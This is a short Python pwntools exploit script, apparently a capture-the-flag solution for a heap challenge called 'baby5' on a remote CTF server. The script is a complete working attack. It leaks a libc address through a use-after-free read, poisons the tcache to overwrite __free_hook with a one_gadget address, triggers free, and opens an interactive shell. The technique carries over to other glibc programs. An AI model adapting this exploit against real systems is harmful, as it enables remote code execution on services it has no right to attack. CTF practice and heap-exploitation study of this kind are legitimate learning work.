from pwn import *

context.log_level = 'debug'
r = remote('baby-01.pwn.beer', 10005)
#r = process('./baby5')
#gdb.attach(r)

elf = ELF('./baby5')
libc = elf.libc
main_arena_offset = 4111424
free_hook_offset = libc.symbols['__free_hook']
one_gadget_offset = [0x4f2c5,0x4f322,0x10a38c][1]

def add(size, content):
    r.sendlineafter('> ', '1')
    r.sendlineafter(': ', str(size))
    r.sendafter(': ', content)

def edit(idx, size, content):
    r.sendlineafter('> ', '2')
    r.sendlineafter(': ', str(idx))
    r.sendlineafter(': ', str(size))
    r.sendafter(': ', content)

def delete(idx):
    r.sendlineafter('> ', '3')
    r.sendlineafter(': ', str(idx))

def show(idx):
    r.sendlineafter('> ', '4')
    r.sendlineafter(': ', str(idx))
    r.recvuntil(': ')
    return r.recvuntil('\n')[:-1]

add(200, 'a'*0x10)
add(200, 'a'*0x10)
add(200, 'a'*0x10)
add(200, 'a'*0x10)
add(200, 'a'*0x10)
add(200, 'a'*0x10)
add(200, 'a'*0x10)
add(200, 'a'*0x10)
delete(7)
delete(6)
delete(5)
delete(4)
delete(3)
delete(2)
delete(1)
delete(0)

libc_base = u64(show(0).ljust(8,'\x00')) - 96 - main_arena_offset
free_hook = libc_base + free_hook_offset
one_gadget = libc_base + one_gadget_offset

edit(1, 100, p64(free_hook))
add(200, 'a'*0x10)
add(200, p64(one_gadget))
delete(0)

r.interactive()

